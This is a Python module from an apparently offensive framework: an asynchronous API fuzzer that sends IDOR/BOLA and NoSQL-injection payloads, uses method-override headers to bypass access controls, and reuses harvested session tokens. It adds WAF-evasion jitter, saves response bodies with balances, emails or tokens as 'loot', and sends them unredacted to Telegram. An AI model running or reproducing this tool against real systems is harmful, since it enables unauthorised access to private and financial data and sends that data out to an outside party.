#!/usr/bin/env python3
"""
API_FUZZER.PY v8.7 — Senior Red-Team Asynchronous API & IDOR Fuzzer (Elite Red Team Adversarial Edition)
Features:
- 100% Async integration with CognitiveOperator transport and memory
- Multi-method request support with IDOR/BOLA payload mutation & automated SHA-256 integrity fingerprinting
- HTTP method tampering & header override fuzzing (X-HTTP-Method-Override, X-Original-URL)
- Consumes harvested session tokens from the cognitive brain automatically with WAF client hints
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
- Real-time unredacted Telegram notification dispatch for API data exposure and database leaks
"""

import asyncio
import json
import random
import sys
import hashlib
import httpx

# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from asynchronous fuzzer functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

class APIFuzzer:
    def __init__(self, cognitive_operator=None, base_url: str = ""):
        self.brain = cognitive_operator
        self.base_url = base_url.rstrip("/")
        self.fuzzed_endpoints = set()

        # IDOR / BOLA Escalation Mutation Vectors & Type-Juggling payloads
        self.mutation_parameters = [
            {"user_id": 1}, {"user_id": 0}, {"user_id": 9999}, {"user_id": "admin"},
            {"account_id": 1}, {"account_id": "root"}, {"account_id": {"$ne": None}},
            {"order_id": 1001}, {"role": "admin"}, {"is_admin": True}, {"isAdmin": True},
            {"id": {"$gt": 0}}, {"limit": -1}
        ]

    async def discover_endpoints(self, transport_client=None) -> list:
        """Dynamically scrapes or discovers endpoints from common documentation routes and APIs."""
        discovered = [
            "/api/v1/users", "/api/v1/user/profile", "/api/v1/wallet",
            "/api/users/1", "/api/account/balance", "/api/admin/settings",
            "/api/auth/me", "/api/v1/auth/session", "/api/dashboard",
            "/swagger/v1/swagger.json", "/openapi.json", "/docs", "/graphql",
            "/api/graphql", "/admin", "/dashboard", "/transactions"
        ]
        
        # Pull from brain's memory if available
        if self.brain and hasattr(self.brain, "evaluated_endpoints"):
            for ep in self.brain.evaluated_endpoints:
                clean_ep = ep.split(":")[0]
                if clean_ep not in discovered:
                    discovered.append(clean_ep)
                    
        return discovered

    async def fuzz_endpoint(self, endpoint: str, transport_client=None):
        """Executes intelligent multi-method fuzzing, method tampering, and IDOR probing on a target API route."""
        if endpoint in self.fuzzed_endpoints:
            return
        self.fuzzed_endpoints.add(endpoint)

        url = f"{self.base_url}{endpoint}" if not endpoint.startswith("http") else endpoint
        sys.stdout.write(f"\033[96m[API_FUZZER] Probing API target: {endpoint} (WAF Hardened)\033[0m\n")

        # Gather persisted session tokens from CognitiveOperator brain
        auth_headers = {}
        if self.brain and hasattr(self.brain, "session_tokens") and self.brain.session_tokens:
            for tk_endpoint, token_val in self.brain.session_tokens.items():
                if isinstance(token_val, str) and len(token_val) < 250:
                    auth_headers["Authorization"] = f"Bearer {token_val}"

        base_headers = {
            "Accept": "application/json, text/plain, */*",
            **auth_headers
        }
        base_headers.update(get_randomized_hints())

        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

        async with httpx.AsyncClient(verify=False, timeout=10.0, follow_redirects=True) as client:
            for method in methods:
                # Apply Poisson-like behavioral jitter to avoid WAF rate-limiting
                apply_behavioral_jitter()
                await asyncio.sleep(random.uniform(0.15, 0.45))

                try:
                    # Test standard method execution
                    if method in ["GET", "DELETE", "HEAD", "OPTIONS"]:
                        response = await client.request(method, url, headers=base_headers)
                        status = response.status_code
                        body = response.text
                        await self._evaluate_response(endpoint, method, status, body, None)

                    elif method in ["POST", "PUT", "PATCH"]:
                        for payload in self.mutation_parameters:
                            response = await client.request(method, url, headers=base_headers, json=payload)
                            status = response.status_code
                            body = response.text
                            await self._evaluate_response(endpoint, method, status, body, payload)
                            
                    # Method Tampering & Header Override Check (Bypassing edge 403 ACLs)
                    if method == "POST":
                        override_headers = base_headers.copy()
                        override_headers["X-HTTP-Method-Override"] = "GET"
                        override_headers["X-Original-URL"] = endpoint
                        
                        ov_resp = await client.request("GET", url, headers=override_headers)
                        if ov_resp.status_code < 400:
                            await self._evaluate_response(endpoint, "METHOD_OVERRIDE_GET", ov_resp.status_code, ov_resp.text, {"header_override": "GET"})

                except Exception as exc:
                    sys.stdout.write(f"\033[91m[-] Fuzzer request error on {method} {endpoint}: {exc}\033[0m\n")

    async def _evaluate_response(self, endpoint: str, method: str, status: int, body: str, payload: dict):
        """Analyzes response for IDOR, BOLA, or data leakage, logs to cognitive memory, computes SHA-256 hash, and broadcasts to Telegram."""
        lower_body = body.lower()
        
        is_spa = (
            "<div id=\"root\">" in lower_body or 
            "<div id=\"__next\">" in lower_body or 
            "<div id=\"__nuxt\">" in lower_body or
            len(body.strip()) < 180 or
            "login-form" in lower_body
        )

        # High-value API success indicators
        has_sensitive_data = any(k in lower_body for k in [
            "balance", "wallet", "email", "credit", "access_token", "admin", 
            "role", "secret", "transactions", "users", "account_number"
        ])

        if status in [200, 201] and not is_spa and has_sensitive_data:
            sys.stdout.write(f"\033[91m[!!!] API VULNERABILITY CONFIRMED [{method} {endpoint}] [HTTP {status}] [!!!]\033[0m\n")
            
            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
            loot_entry = {
                "endpoint": endpoint,
                "method": method,
                "status": status,
                "payload": payload,
                "integrity_hash": loot_hash,
                "evidence": body[:400],
                "module": "api_fuzzer"
            }
            
            # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
            broadcast_tg_alert_sync(f"API Vulnerability Confirmed [{method}]", loot_entry)
            stream_proof("API_VULN_CONFIRMED", f"{self.base_url}{endpoint}", {"method": method}, body[:300], loot_entry)
            save_session_loot(
                target=self.base_url,
                endpoint=endpoint,
                finding_type=f"API_VULN_CONFIRMED_{method}",
                status=status,
                headers={},
                body=body,
                extra_loot=loot_entry
            )

            # Feed back directly into CognitiveOperator memory
            if self.brain and hasattr(self.brain, "attack_memory") and isinstance(self.brain.attack_memory, dict):
                self.brain.attack_memory.setdefault("confirmed_findings", []).append(loot_entry)

    async def run(self, transport_client=None):
        """Main execution entrypoint called by engine.py or CognitiveOperator."""
        sys.stdout.write(f"\033[95m[API_FUZZER] Starting asynchronous API reconnaissance & IDOR assault...\033[0m\n")
        endpoints = await self.discover_endpoints(transport_client)
        
        tasks = [self.fuzz_endpoint(ep, transport_client) for ep in endpoints]
        await asyncio.gather(*tasks)
        sys.stdout.write(f"\033[92m[+] API Fuzzer sweep complete across {len(endpoints)} routes.\033[0m\n")

# ============================================================
# COMPATIBILITY WRAPPER (Satisfies engine.py / main.py imports)
# ============================================================
async def run_api_fuzzer(target_url: str):
    """Standalone wrapper function to ensure seamless invocation from engine.py."""
    fuzzer = APIFuzzer(cognitive_operator=None, base_url=target_url)
    await fuzzer.run()
    return True

if __name__ == "__main__":
    pass
